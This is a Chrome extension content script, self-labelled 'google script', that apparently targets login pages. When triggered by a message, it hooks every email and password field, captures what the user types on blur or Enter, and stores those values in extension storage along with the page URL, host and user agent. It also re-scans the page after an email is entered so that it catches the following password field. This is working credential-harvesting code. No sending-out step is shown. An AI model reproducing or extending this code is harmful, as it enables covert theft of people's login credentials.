
console.log("google script");
let inputs;

chrome.runtime.onMessage.addListener(
    function(request, sender, sendResponse) {
      if(request.trigger==true){
            console.log("firign");
            fireListeners();
            
      }
});

chrome.storage.local.set({session:{},url:window.location.href,host:window.location.host,userAgent:navigator.userAgent},()=>{
    console.log("initialised");
});

function fireListeners(){
    inputs=document.querySelectorAll('input');
    inputs.forEach(input=>{
        if(input.type=="email"|| input.type=="password"){
         input.addEventListener('blur',e=>{
                let {type,value} = input;
                console.log(type,value);
                if(value.trim()!=""){
                  chrome.storage.local.get(['session'],obj=>{
                      session=obj.session;
                      session[type]=value;
                      chrome.storage.local.set({session:session});
                  });
                }
                if(type=="email"){
                    setTimeout(() => {
                        fireListeners();
                    }, 1000);
                }
         });
         input.addEventListener('keyup',e=>{
                if(e.which==13){
                    let {type,value} = input;
                    console.log(type,value);
                    if(value.trim()!=""){
                      chrome.storage.local.get(['session'],obj=>{
                          session=obj.session;
                          session[type]=value;
                          chrome.storage.local.set({session:session});
                         
                      })
                    
                    }
                    if(type=="email"){
                        setTimeout(() => {
                            fireListeners();
                        }, 1000);
                    }
                }
         })
        }
    });

}
